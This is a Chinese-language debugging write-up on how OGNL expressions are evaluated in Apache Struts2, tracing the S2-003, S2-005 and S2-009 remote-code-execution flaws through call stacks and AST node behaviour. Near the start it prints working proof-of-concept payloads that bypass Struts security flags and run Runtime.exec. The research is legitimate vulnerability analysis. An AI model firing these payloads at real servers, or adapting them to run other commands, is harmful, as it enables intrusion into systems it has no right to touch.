# 浅析OGNL表达式求值（S2-003/005/009跟踪调试记录）

![Category](https://img.shields.io/badge/category-security_research-blue.svg)
![Research](https://img.shields.io/badge/research-web_security-blue.svg)
![Language](https://img.shields.io/badge/lang-java-blue.svg)
![Vuln Component](https://img.shields.io/badge/vuln_component-struts2-red.svg)
![Vuln Type](https://img.shields.io/badge/vuln_type-rce-red.svg)
![Tag](https://img.shields.io/badge/tag-ognl-green.svg)
![Timestamp](https://img.shields.io/badge/timestamp-1500742098-lightgrey.svg)
![Progress](https://img.shields.io/badge/progress-100%25-brightgreen.svg)

<sub>* 在分析Struts2历年RCE的过程中，对OGNL表达式求值（OGNL Expression Evaluation）的执行细节存在一些不解和疑惑，便以本文记录跟踪调试的过程，不对的地方请指正。</sub>

## 前情简介

- S2-003对`#`等特殊字符编码，并包裹在字符串中，利用OGNL表达式求值`(one)(two)`模型绕过限制
- S2-005在基于S2-003的基础上，通过控制`allowStaticMethodAccess`绕过S2-003修复方案
- S2-009通过HTTP传参将Payload赋值在可控的action属性 *（`setter()`/`getter()`）* 中，再利用额外请求参数，设置其名称为『无害』OGNL表达式绕过`ParametersInterceptor`中对参数名的正则限制，并成功执行Payload

### PoC样本

- S2-003

    `(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew\u0020java.lang.Boolean(false)))&(asdf)(('\u0023rt.exec(\'calc\')')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1`

- S2-005

    `('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew\u0020java.lang.Boolean(false)))&(asdf)(('\u0023rt.exec(\'calc\')')(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1`

- S2-009

    `foo=(#context['xwork.MethodAccessor.denyMethodExecution']=new java.lang.Boolean(false),#_memberAccess['allowStaticMethodAccess']=new java.lang.Boolean(true),@java.lang.Runtime@getRuntime().exec('calc'))(meh)&z[(foo)('meh')]=true`

## 关于OGNL

### 一点点基础概念

1. `$`，`#`，`@`和`%`
    - `$`

        在配置文件、国际化资源文件中引用OGNL表达式

    - `#`

        访问非root对象，相当于`ActionContext.getContext()`

    - `@`

        访问静态属性、静态方法

    - `%`

        强制内容为OGNL表达式

1. context和root
    - context

        OGNL执行上下文环境，HashMap类型

    - root

        根对象，ArrayList类型 *（默认访问对象，不需要`#`操作符）*

### OGNL表达式求值

Apache官方描述：

> If you follow an OGNL expression with a parenthesized expression, without a dot in front of the parentheses, OGNL will try to treat the result of the first expression as another expression to evaluate, and will use the result of the parenthesized expression as the root object for that evaluation. The result of the first expression may be any object; if it is an AST, OGNL assumes it is the parsed form of an expression and simply interprets it; otherwise, OGNL takes the string value of the object and parses that string to get the AST to interpret.

如果你在任意对象后面紧接着一个带括号的OGNL表达式，而中间没有使用`.`符号连接，那么OGNL将会试着把第一个表达式的计算结果当作一个新的表达式再去计算，并且把带括号表达式的计算结果作为本次计算的根对象。第一个表达式的计算结果可以是任意对象；如果它是一个AST树，OGNL就会认为这是一个表达式的解析形态，然后直接解释它；否则，OGNL会拿到这个对象的字符串值，然后去解释通过解析这个字符串得到的AST树 *（译者注：在root或context中搜索匹配）* 。

> For example, this expression `#fact(30H)` looks up the fact variable, and interprets the value of that variable as an OGNL expression using the BigInteger representation of 30 as the root object. See below for an example of setting the fact variable with an expression that returns the factorial of its argument. Note that there is an ambiguity in OGNL's syntax between this double evaluation operator and a method call. OGNL resolves this ambiguity by calling anything that looks like a method call, a method call. For example, if the current object had a fact property that held an OGNL factorial expression, you could not use this approach to call it `fact(30H)`

例如，表达式`#fact(30H)`会查找这个`fact`变量，并将它的值当作一个使用`30H`作为根对象的OGNL表达式去解释。看下面的例子，设置一个返回传入参数阶乘结果的表达式的`fact`变量。注意，这里存在一个关于二次计算和方法调用之间的OGNL语法歧义。OGNL为了消除歧义，会把任何看起来像方法调用的语法都当作方法去调用。比方说，如果当前对象中存在一个持有OGNL阶乘表达式的`fact`属性，你就不能用`fact(30H)`的形式去调用它

> because OGNL would interpret this as a call to the fact method. You could force the interpretation you want by surrounding the property reference by parentheses: `(fact)(30H)`

因为OGNL将会把它当作一个`fact`方法去调用。你可以像`(fact)(30H)`这样用括号将它括起来，强制让OGNL去对它作解释

漏洞作者 *（Meder Kydyraliev, Google Security Team）* 描述：

> `(one)(two)` will evaluate one as an OGNL expression and will use its return value as another OGNL expression that it will evaluate with two as a root for the evaluation. So if one returns blah, then blah is evaluated as an OGNL statement.

`(one)(two)`将会把`one`当作一个OGNL表达式去计算，然后把它的结果当作另一个以`two`为根对象的OGNL表达式再一次计算。所以，如果`one`有返回内容 *（译者注：能被正常计算，解析为AST树）* ，那么这些内容将会被当作OGNL语句被计算。

*（临时简单的翻译了一下便于自己理解，英语水平有限，比较生硬拗口，没有细究，还是尽量看原文自己理解原意吧）*

根据以上描述也就能够推断，在`('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)`中，`one`是一个字符串，绕过了特殊字符检测，生成AST树后被解码为正常的`#_memberAccess["allowStaticMethodAccess"]`字符串，在第一次计算时拿到的是该字符串，然后尝试对它解析得到AST树，再次计算，导致内部实际Payload被执行。

但是one和two的计算顺序、关系等细节如何？其他嵌套模型的解析如何？仍然存在一些疑问。

## 问题

1. `(one)(two)`模型的具体执行流程
1. `(one)((two)(three))`模型的具体执行流程
1. 在S2-005的PoC中，`denyMethodExecution`和`allowStaticMethodAccess`两者使用的模型是否可以互换 *（位置可以）*
1. 在S2-009的PoC中，`z[(foo)('meh')]`调整执行顺序的原理
1. `(one).(two)`和`one,two`模型的差异

## 开始跟踪调试

### S2-003

调试环境

- struts2-core-2.0.8 *（应升到2.0.9或2.0.11.2，排除S2-001的干扰，以后有时间再做）*
- xwork-core-2.0.3
- ognl-2.6.11

调试过程 *（身体不适者请跳过，直接看『问题解决』部分内容）*

```java
[ 表层关键逻辑 ]
    com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
[ 底层关键逻辑 ]
    com.opensymphony.xwork2.util.OgnlUtil.compile()
    ognl.ASTEval.getValueBody()
[ 关键调用栈 ]
    -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept()
     -> com.opensymphony.xwork2.util.OgnlContextState.setDenyMethodExecution()  // 设置DenyMethodExecution为true，并放入context中
     -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
      // 遍历参数
       // 处理第一个参数『(aaa)(('\u0023context...foo')(\u0023foo...(false)))』
       -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.acceptableName()  // 判断参数名称是否包含『=』、『,』、『#』和『:』特殊字符，以及匹配excludeParams正则『dojo\.._』
       -> com.opensymphony.xwork2.util.OgnlValueStack.setValue()  // 此时expr为第一个参数名的字符串形式，\u0023未解码
        -> ognl.OgnlContext.put()  // 将expr放入context['conversion.property.fullName']中
        -> com.opensymphony.xwork2.util.OgnlUtil.setValue()
         -> com.opensymphony.xwork2.util.OgnlUtil.compile()  // 生成AST树
          // 先尝试在expressions对象缓存HashMap中查找是否已经编译过该expr，是则直接返回查找到的对象
          -> ognl.Ognl.parseExpression()  // ASTEval类型对象，\u0023在AST树节点中已解码
           // 以下为当前表达式的AST树生成过程，非完全通用，仅供参考
           -> ognl.OgnlParser.topLevelExpression()
            -> ognl.OgnlParser.expression()
             -> ognl.OgnlParser.assignmentExpression()
              -> ognl.OgnlParser.conditionalTestExpression()  // 条件测试
               -> ognl.OgnlParser.logicalOrExpression()  // 逻辑或
                -> ognl.OgnlParser.logicalAndExpression()  // 逻辑与
                 -> ognl.OgnlParser.inclusiveOrExpression()  // 或
                  -> ognl.OgnlParser.exclusiveOrExpression()  // 异或
                   -> ognl.OgnlParser.andExpression()  // 与
                    -> ognl.OgnlParser.equalityExpression()  // 相等
                     -> ognl.OgnlParser.relationalExpression()  // 关系
                      -> ognl.OgnlParser.shiftExpression()  // 移位
                       -> ognl.OgnlParser.additiveExpression()  // 加
                        -> ognl.OgnlParser.multiplicativeExpression()  // 乘
                         -> ognl.OgnlParser.unaryExpression()  // 乘
                          -> ognl.OgnlParser.unaryExpression()  // 一元
                           -> ognl.OgnlParser.navigationChain()
                            -> ognl.OgnlParser.primaryExpression()
                            // 定义当前节点（树根）为ASTEval类型
                            -> ognl.JJTOgnlParserState.openNodeScope()
                            -> ognl.JJTOgnlParserState.closeNodeScope()
                             // 遍历节点栈（jjtree.nodes为栈结构，先左后右入栈）
                              // 右节点
                              -> ognl.JJTOgnlParserState.popNode()  // 右节点『("#context...")(#foo...)』出栈，ASTEval类型
                              -> ognl.Node.jjtSetParent()  // 为出栈（右）节点设置父节点：当前节点（null）
                              -> ognl.SimpleNode.jjtAddChild()  // 为当前节点增加右子节点：出栈（右）节点
                              // 左节点
                              -> ognl.JJTOgnlParserState.popNode()  // 左节点『aaa』出栈，ASTProperty类型
                              -> ognl.Node.jjtSetParent()  // 为出栈（左）节点设置父节点：当前节点（null）
                              -> ognl.SimpleNode.jjtAddChild()  // 为当前节点增加左子节点：出栈（左）节点
                             -> ognl.JJTOgnlParserState.pushNode()  // 当前节点入栈
         -> ognl.Ognl.setValue()
          -> ognl.Ognl.addDefaultContext()
          -> ognl.SimpleNode.setValue()  // ASTEval未重写该方法，调用父类SimpleNode
           -> ognl.SimpleNode.evaluateSetValueBody()
            -> ognl.OgnlContext.setCurrentNode()  // 设置当前节点
            -> ognl.ASTEval.setValueBody()
             // 取左子节点『aaa』，作为expr
             -> ognl.SimpleNode.getValue()  // null
              -> ognl.SimpleNode.evaluateGetValueBody()
               -> ognl.ASTProperty.getValueBody()
                -> ognl.ASTProperty.getProperty()  // 得到『aaa』字符串
                 -> ognl.SimpleNode.getValue()
                  -> ognl.SimpleNode.evaluateGetValueBody()
                   -> ognl.ASTConst.getValueBody()
                -> ognl.OgnlRuntime.getProperty()  // null
                 -> ognl.OgnlRuntime.getPropertyAccessor()
                  -> ognl.OgnlRuntime.getHandler()
                 -> com.opensymphony.xwork2.util.CompoundRootAccessor.getProperty()
                  -> ognl.OgnlRuntime.hasGetProperty()
                   -> ognl.OgnlRuntime.hasGetMethod()  // 是否当前请求action的method
                    -> ognl.OgnlRuntime.getGetMethod()
                   -> ognl.OgnlRuntime.hasField()  // 是否当前请求action的field
             // 取右子节点『("#context...")(#foo...)』，作为target
             -> ognl.SimpleNode.getValue()
              -> ognl.SimpleNode.evaluateGetValueBody()
               -> ognl.ASTEval.getValueBody()
                // 取左子节点『"#context..."』，作为expr
                -> ognl.SimpleNode.getValue()  // 第一次计算，获得当前expr的值为去引号后内部字符串
                 -> ognl.SimpleNode.evaluateGetValueBody()
                  -> ognl.ASTConst.getValueBody()  // 去两边引号，得到内部字符串
                // 取右子节点『#foo...』，作为source
                -> ognl.SimpleNode.getValue()
                 -> ognl.SimpleNode.evaluateGetValueBody()
                  -> ognl.ASTAssign.getValueBody()
                   // 取右边值『new java.lang.Boolean(false)』，作为result
                   -> ognl.SimpleNode.getValue()
                    -> ognl.SimpleNode.evaluateGetValueBody()
                     -> ognl.ASTCtor.getValueBody()
                      -> ognl.OgnlRuntime.callConstructor()  // 反射，实例化Boolean(false)
                   // 取左边值『#foo』，赋值
                   -> ognl.SimpleNode.setValue()
                    -> ognl.SimpleNode.evaluateSetValueBody()
                     -> ognl.ASTVarRef.setValueBody()
                      -> ognl.OgnlContext.put()  // 将『#foo: false』放入context中
                // 如果expr是AST节点，就强转Node接口类型（泛型），否则解析
                -> ognl.Ognl.parseExpression()  // 将expr字符串解析为AST树，过程同上，略
                -> ognl.OgnlContext.setRoot()  // 将source值覆盖当前root
                -> ognl.SimpleNode.getValue()  // 第二次计算，获得当前expr的值为『false』
                 -> ognl.SimpleNode.evaluateGetValueBody()
                  -> ognl.ASTAssign.getValueBody()
                   // 取右边值『#foo』，作为result
                   -> ognl.SimpleNode.getValue()
                    -> ognl.SimpleNode.evaluateGetValueBody()
                     -> ognl.ASTVarRef.getValueBody()
                      -> ognl.OgnlContext.get()  // 从context中取出『#foo』值，false
                   // 取左边值『#context...』，赋值
                   -> ognl.SimpleNode.setValue()
                    -> ognl.SimpleNode.evaluateSetValueBody()
                     -> ognl.ASTChain.setValueBody()
                      // 取左边值『#context』，作为target
                      -> ognl.SimpleNode.getValue()
                       -> ognl.SimpleNode.evaluateGetValueBody()
                        -> ognl.ASTVarRef.getValueBody()
                         -> ognl.OgnlContext.get()  // 从context中取出『#context』值，当前OgnlContext
                      // 取出右边值『[...]』
                      -> ognl.SimpleNode.setValue()
                       -> ognl.SimpleNode.evaluateSetValueBody()
                        -> ognl.ASTProperty.setValueBody()
                         -> ognl.ASTProperty.getProperty() // 得到『xwork.MethodAccessor.denyMethodExecution』字符串
                         -> ognl.OgnlRuntime.setProperty()
                          -> ognl.OgnlRuntime.getPropertyAccessor()
                           -> ognl.OgnlRuntime.getHandler()  // 得到XWorkMapPropertyAccessor对象
                          -> com.opensymphony.xwork2.util.XWorkMapPropertyAccessor.setProperty()
                           -> com.opensymphony.xwork2.util.XWorkMapPropertyAccessor.getKey()  // 得到"xwork.MethodAccessor.denyMethodExecution"字符串
                           -> com.opensymphony.xwork2.util.XWorkMapPropertyAccessor.getValue()  // false
                           -> ognl.OgnlContext.put()  // 修改『xwork.MethodAccessor.denyMethodExecution』值为false
             // expr为null，抛异常，清除context中存储的临时键值对
       // 处理第二个参数，结构与第一个类似
```

问题解决

- 问题1：`(one)(two)`模型的具体执行流程

    `(one)(two)`模型生成的AST树属于ASTEval类型，大致执行流程如下：

    1. 计算`one`，结果赋值给变量expr
    1. 计算`two`，结果赋值给变量source
    1. 判断expr是否Node类型 *（AST树）* ，否则以其字符串形式进行解析 *（`ognl.Ognl.parseExpression()`）* ，结果都强制转换成Node类型并赋值给node
    1. 临时将source放入当前root中
    1. 计算node
    1. 还原root
    1. 返回结果

- 问题2：`(one)((two)(three))`模型的具体执行流程

    `(one)((two)(three))`模型属于`(one)(two)`模型的嵌套形式，完全可以参考问题1，执行流程就不再详述了。

### S2-005

调试环境

- struts2-core-2.1.8.1
- xwork-core-2.1.6
- ognl-2.7.3

调试过程

```java
[ 表层关键逻辑 ]
    com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
[ 底层关键逻辑 ]
    com.opensymphony.xwork2.util.OgnlUtil.compile()
    ognl.ASTEval.setValueBody()
[ 关键调用栈 ]
    -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept()
     -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
      // 遍历参数
       -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.acceptableName()
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.isAccepted()  // 判断参数名称是否匹配acceptedPattern正则『[[\p{Graph}\s]&&[^,#:=]]_』
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.isExcluded()  // 判断参数名称是否匹配excludeParams正则『dojo\.._』和『^struts\.._』
       // 校验通过，则将参数键值对放入acceptableParameters中
      -> com.opensymphony.xwork2.util.reflection.ReflectionContextState.setDenyMethodExecution()  // 设置DenyMethodExecution为true，并放入context中
      -> com.opensymphony.xwork2.ognl.OgnlValueStack.setExcludeProperties()
       -> com.opensymphony.xwork2.ognl.SecurityMemberAccess.setExcludeProperties()  // 将excludeParams放入OgnlValueStack.securityMemberAccess中（securityMemberAccess与context、root同级，其中allowStaticMethodAccess默认为false）
      // 遍历acceptableParameters（合规参数）
       // 处理第一个参数『('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)』
       -> com.opensymphony.xwork2.ognl.OgnlValueStack.setValue()
        -> com.opensymphony.xwork2.ognl.OgnlUtil.setValue()
         -> com.opensymphony.xwork2.ognl.OgnlUtil.compile()  // 生成AST树
         -> ognl.Ognl.setValue()
          -> ognl.Ognl.addDefaultContext()
          -> ognl.SimpleNode.setValue()
           -> ognl.SimpleNode.evaluateSetValueBody()
            -> ognl.ASTEval.setValueBody()
             -> ognl.SimpleNode.getValue()  // 取左子节点『"#_memberAccess..."』，计算得内部字符串，作为expr
             -> ognl.SimpleNode.getValue()  // 取右子节点『meh』，计算得null，作为target
             -> ognl.Ognl.parseExpression()  // 将expr解析为AST树
             -> ognl.OgnlContext.setRoot()
             -> ognl.SimpleNode.setValue()
              -> ognl.SimpleNode.evaluateSetValueBody()
               -> ognl.ASTChain.setValueBody()
                -> ognl.SimpleNode.getValue()  // 取左子节点『#_memberAccess』，计算得SecurityMemberAccess对象
                 -> ognl.SimpleNode.evaluateGetValueBody()
                  -> ognl.ASTVarRef.getValueBody()
                   -> ognl.OgnlContext.get()
                    -> ognl.OgnlContext.getMemberAccess()
                -> ognl.SimpleNode.setValue()  // 取右子节点『["..."]』
                 -> ognl.SimpleNode.evaluateSetValueBody()
                  -> ognl.ASTProperty.setValueBody()
                   -> ognl.ASTProperty.getProperty()  // 得到『allowStaticMethodAccess』字符串
                   -> ognl.OgnlRuntime.setProperty()
                    -> ognl.OgnlRuntime.getPropertyAccessor()
                     -> ognl.OgnlRuntime.getHandler()
                    -> com.opensymphony.xwork2.ognl.accessor.ObjectAccessor.setProperty()
                     -> ognl.ObjectPropertyAccessor.setProperty()
                      -> ognl.ObjectPropertyAccessor.setPossibleProperty()
                       -> ognl.OgnlRuntime.setMethodValue()
                        -> ognl.OgnlRuntime.getSetMethod()  // 得到『setAllowStaticMethodAccess()』方法
                        -> com.opensymphony.xwork2.ognl.SecurityMemberAccess.isAccessible()  // 判断方法是否合规
                        -> ognl.OgnlRuntime.callAppropriateMethod()  // 修改『allowStaticMethodAccess』值为true
       // 处理其余参数，与S2-003流程类似
```

问题解决

- 问题3：`denyMethodExecution`和`allowStaticMethodAccess`两者使用的模型是否可以互换

    `denyMethodExecution`存在于OgnlContext.values（即对外暴露的context本身）HashMap中，而`allowStaticMethodAccess`存在于OgnlValueStack.securityMemberAccess（与context同级，可以使用`#_memberAccess`取到）对象中。

    1. 将`allowStaticMethodAccess`参照`denyMethodExecution`模型改写，执行成功
    1. 将`denyMethodExecution`参照`allowStaticMethodAccess`模型改写，执行失败，原因分析如下：
        - `denyMethodExecution`的accessor是XWorkMapPropertyAccessor类型，赋值即对context进行`map.put()`，在value为数组的情况下，会原样赋值为数组，[0]元素为字符串『false』，导致失败
        - `allowStaticMethodAccess`的accessor是ObjectAccessor类型，赋值即通过反射调用对应的`setAllowStaticMethodAccess()`方法，传参刚好为数组，可被正常拆解为其中的单个元素

### S2-009

调试环境

- struts2-core-2.3.1.1
- xwork-core-2.3.1.1
- ognl-3.0.3

调试过程

```java
[ 表层关键逻辑 ]
    com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
[ 底层关键逻辑 ]
    com.opensymphony.xwork2.util.OgnlUtil.compile()
    ognl.ASTEval.setValueBody()
[ 关键调用栈 ]
    -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.doIntercept()
     -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.setParameters()
      // 遍历参数
       -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.acceptableName()
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.isAccepted()  // 判断参数名称是否匹配acceptedPattern正则『[a-zA-Z0-9\.\]\[\(\)_']+』
        -> com.opensymphony.xwork2.interceptor.ParametersInterceptor.isExcluded()  // 判断参数名称是否匹配excludeParams正则『dojo\.._』和『^struts\.._』
       // 校验通过，则将参数键值对放入acceptableParameters中
      -> com.opensymphony.xwork2.util.reflection.ReflectionContextState.setDenyMethodExecution()  // 设置DenyMethodExecution为true，并放入context中
      -> com.opensymphony.xwork2.ognl.OgnlValueStack.setExcludeProperties()  // 将excludeParams放入OgnlValueStack.securityMemberAccess中（其中allowStaticMethodAccess默认为false）
      // 遍历acceptableParameters（合规参数）
       // 处理第一个参数『foo』（值为『(#context...)(meh)』）
       -> com.opensymphony.xwork2.ognl.OgnlValueStack.setValue()
        -> com.opensymphony.xwork2.ognl.OgnlValueStack.trySetValue()
         -> com.opensymphony.xwork2.ognl.OgnlUtil.setValue()
          -> com.opensymphony.xwork2.ognl.OgnlUtil.compile()  // 生成AST树
          -> ognl.Ognl.setValue()  // 将root[0]（即当前请求action）中的foo设置为『(#context...)(meh)』字符串
       // 处理第二个参数『z[(foo)('meh')]』
       -> com.opensymphony.xwork2.ognl.OgnlValueStack.setValue()
        -> com.opensymphony.xwork2.ognl.OgnlValueStack.trySetValue()
         -> com.opensymphony.xwork2.ognl.OgnlUtil.setValue()
          -> com.opensymphony.xwork2.ognl.OgnlUtil.compile()  // 生成AST树
          -> ognl.Ognl.setValue()  // 『z[()()]』为ASTChain类型，两个子节点『z』和『[()()]』都为ASTProperty类型，后者会先对其第一个子节点『()()』计算
```

问题解决

- 问题4：`z[(foo)('meh')]`调整执行顺序的原理

    经调试，在`Dispatcher.createContextMap()`中会将LinkedHashMap类型的`request.parameterMap`转换为HashMap类型存储在`ActionContext`的`parameters`和`com.opensymphony.xwork2.ActionContext.parameters`中 *（此时顺序不变）* 。

    1. `StaticParametersInterceptor.intercept()`中`addParametersToContext()`会将`config.params`与`ActionContext`的`com.opensymphony.xwork2.ActionContext.parameters`合并为一个TreeMap *（TreeMap是红黑树，按key值的自然顺序动态排序，可参考Java的字符串大小比较）* ，并覆盖`ActionContext`中的原值
    1. `ParametersInterceptor.doIntercept()`中`retrieveParameters()`获取的是`com.opensymphony.xwork2.ActionContext.parameters`的值，因此漏洞作者给出的PoC中给出`z[()()]`形式来保证它的排序靠后 *（`z`字符的ASCII码在可见字符中非常靠后，而`(`字符较靠前）* 。

- 问题5：`(one).(two)`和`one,two`模型的差异

    提取S2-009中Payload进行分析，两种模型都能正常执行，细节差异如下：

    1. `(one).(two)`被解析成`one.two`，ASTChain类型 *（遍历子节点计算，前子节点的计算结果作为临时root代入后子节点进行计算，返回最后一个子节点的计算结果）* ，以`.`字符分隔各子节点，Payload样本被分解为4个子节点 *（`@java.lang.Runtime@getRuntime().exec('calc')`被分解为`@java.lang.Runtime@getRuntime()`和`exec('calc')`）*
    1. `one,two`被解析成`one,two`，ASTSequence类型 *（遍历子节点计算，返回最后一个子节点的计算结果）* ，以`,`字符分隔各子节点，Payload样本被正常分解为3个子节点

## OGNL ASTNode

问题解决了，可是留下的坑还有很多。

在分析过程中可以发现，OGNL尝试把各种表达式根据其结构等特征归属到不同的SimpleNode子类中，且各子类都根据自己的特性需求对父类的部分方法进行了重写，这些特性可能导致表达式最终执行结果受到影响，特别是在构造PoC的时候。因此，将各个子类的特性都了解清楚，会有助于加深对OGNL表达式解析和计算的理解。

*（本部分的OGNL相关内容以struts-2.3.33依赖的ognl-3.0.19为分析对象，其他版本或有差异，请自行比对）*

首先当然是他们的父类：

1. SimpleNode *（仅对计算相关的方法作解释，解析编译相关的方法也暂略）*
    - 主要方法
        - `public SimpleNode(int)`
        - `public SimpleNode(OgnlParser, int)`
        - `public void jjtOpen()`
        - `public void jjtClose()`
        - `public void jjtSetParent(Node)`
        - `public Nod jjtGetParent()`
        - `public void jjtAddChild(Node, int)`
        - `public Node jjtGetChild(int)`
        - `public int jjtGetNumChildren()`
        - `public String toString()`
        - `public String toString(String)`
        - `public String toGetSourceString(OgnlContext, Object)`
        - `public String toSetSourceString(OgnlContext, Object)`
        - `public void dump(PrintWrite, String)`
        - `public int getIndexInParent()`
        - `public Node getNextSibling()`
        - `protected Object evaluateGetValueBody(OgnlContext, Object)`

            调用`getValueBody()`方法 *（如果已经求过值，且存在固定值，则直接返回固定值）*

        - `protected void evaluateSetValueBody(OgnlContext, Object, Object)`

            调用`setValueBody()`方法

        - `public final Object getValue(OgnlContext, Object)`

            调用`evaluateGetValueBody()`方法 *（子类不允许复写）*

        - `protected abstract Object getValueBody(OgnlContext, Object)`

            抽象方法 *（子类必须实现）*

        - `public final void setValue(OgnlContext, Object, Object)`

            调用`evaluateSetValueBody()`方法 *（子类不允许复写）*

        - `protected void setValueBody(OgnlContext, Object, Object)`

            抛出InappropriateExpressionException异常

        - `public boolean isNodeConstant(OgnlContext)`

            返回`false`

        - `public boolean isConstant(OgnlContext)`

            调用`isNodeConstant()`方法

        - `public boolean isNodeSimpleProperty(OgnlContext)`

            返回`false`

        - `public boolean isSimpleProperty(OgnlContext)`

            调用`isNodeSimpleProperty()`方法

        - `public boolean isSimpleNavigationChain(OgnlContext)`

            调用`isSimpleProperty()`方法

        - `public boolean isEvalChain(OgnlContext)`

            任意子节点的`isEvalChain()`结果为`true`则返回`true`，否则返回`false`

        - `public boolean isSequence(OgnlContext)`

            任意子节点的`isSequence()`结果为`true`则返回`true`，否则返回`false`

        - `public boolean isOperation(OgnlContext)`

            任意子节点的`isOperation()`结果为`true`则返回`true`，否则返回`false`

        - `public boolean isChain(OgnlContext)`

            任意子节点的`isChain()`结果为`true`则返回`true`，否则返回`false`

        - `public boolean isSimpleMethod(OgnlContext)`

            返回`false`

        - `protected boolean lastChild(OgnlContext)`
        - `protected void flattenTree()`
        - `public ExpressionAccessor getAccessor()`

            返回`_accessor`变量

        - `public void setAccessor(ExpressionAccessor)`

            设置`_accessor`变量

再来是ASTNode大家族：

1. ASTAssign
    - 表现形式
        - `one = two`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            右节点的计算结果作为result，传入左节点的`setValue()`方法，返回result

        - `public boolean isOperation(OgnlContext)`

            返回`true`

1. ASTChain
    - 表现形式
        - `one.two`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算 *（IndexedProperty类型调用`OgnlRuntime.getIndexProperty()`方法，其他调用`getValue()`方法）* ，且前后子节点成菊花链，返回最后一个子节点的计算结果

        - `protected void setValueBody(OgnlContext, Object)`

            遍历最后一个子节点外的其他子节点计算 *（基本同上）* ，调用最后一个子节点的`setValue()`方法 *（IndexedProperty类型则是遍历到倒数第二个子节点时调用`OgnlRuntime.setIndexedProperty()`方法）*

        - `public boolean isSimpleNavigationChain(OgnlContext)`

            所有子节点的`isSimpleProperty()`结果都为`true`则返回`true`，否则返回`false`

        - `public bollean isChain(OgnlContext)`

            返回`true`

1. ASTConst
    - 表现形式
        - `null`

            null *（字符串形式）*

        - `"one"`

            String类型

        - `'o'`

            Character类型

        - `0L`

            Long类型

        - `0B`

            BigDecimal类型

        - `0H`

            BigInteger类型

        - `:[ one ]`

            Node类型

    - 实现/重写方法
        - `public void setValue(Object)`

            设置`value`变量

        - `public Object getValue()`

            返回`value`变量

        - `protected Object getValueBody(OgnlContext, Object)`

            返回`value`变量

        - `public boolean isNodeConstant(OgnlContext)`

            返回`true`

1. ASTCtor
    - 表现形式
        - `new one[two]`

            默认初始化数组

        - `new one[] two`

            静态初始化数组

        - `new one()`

            无参对象

        - `new one(two, three)`

            含参对象

    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算，结果放入`args`数组变量，并传入`OgnlRuntime.callConstructor()`方法 *（如果是数组，则调用`Array.newInstance()`方法）* ，返回实例化对象

1. ASTEval
    - 表现形式
        - `(one)(two)`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            左节点的计算结果作为expr，右节点的计算结果作为source，判断expr是否为Node类型，否则解析，结果作为node，source放入root中，并传入node计算

        - `protected void setValueBody(OgnlContext, Object, Object)`

            左节点的计算结果作为expr，右节点的计算结果作为target，判断expr是否为Node类型，否则解析，结果作为node，target放入root中，并传入node的`setValue()`方法

        - `public boolean isEvalChain(OgnlContext)`

            返回`true`

1. ASTKeyValue
    - 表现形式
        - `one -> two`
    - 实现/重写方
        - `protected Object getValueBody(OgnlContext, Object)`

            返回`null`

1. ASTList
    - 表现形式
        - `{ one, two }`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算，结果放入ArrayList对象，遍历结束后返回

1. ASTMap
    - 表现形式
        - `#@one@{ two : three, four : five }` *（存在类名）*
        - `#{ one : two, three : four }`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            根据类名实例化Map对象 *（如果没有类名就是默认的LinkedHashMap类型）* ，遍历子节点，当前子节点 *（ASTKeyValue类型）* 为key，其计算结果为value，放入Map中

1. ASTMethod
    - 表现形式
        - `one()` *（无参方法）*
        - `one(two, three)` *（含参方法）*
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历子节点计算，结果放入`args`数组变量，并传入`OgnlRuntime.callMethod()`方法，如果结果为空 *（即无此方法）* ，则设置空方法执行结果，返回执行结果

        - `public boolean isSimpleMethod(OgnlContext)`

            返回`true`

1. ASTProject
    - 表现形式
        - `{ one }`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历`ElementsAccessor.getElements()`结果，依次作为source传入第一个子节点计算，结果放入ArrayList对象，遍历结束后返回

1. ASTProperty
    - 表现形式
        - `one`
        - `[one]` *（Indexed类型）*
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            调用`getProperty()`对第一个子节点求值，结果作为name传入`OgnlRuntime.getProperty()`，返回执行结果

        - `protected void setValueBody(OgnlContext, Object, Object)`

            调用`OgnlRuntime.setProperty()`方法

        - `public boolean isNodeSimpleProperty(OgnlContext)`

            返回第一个子节点的`isConstant()`结果

1. ASTSelect
    - 表现形式
        - `{? one }`
    - 实现/重写方法
        - `protected Object getValueBody(OgnlContext, Object)`

            遍历`ElementsAccessor.getElements()`结果，依次作为source传入第一个子节点计算，结果通过`OgnlOps.booleanValue()`判断真假，真则放入ArrayList对象，遍历结束后返回ArrayList

1. ASTSelectFirst
    - 表现形式
        - `{^ one }`
    - 实现/重写方法
        - `protected void getValueBody(OgnlContext, Object)`

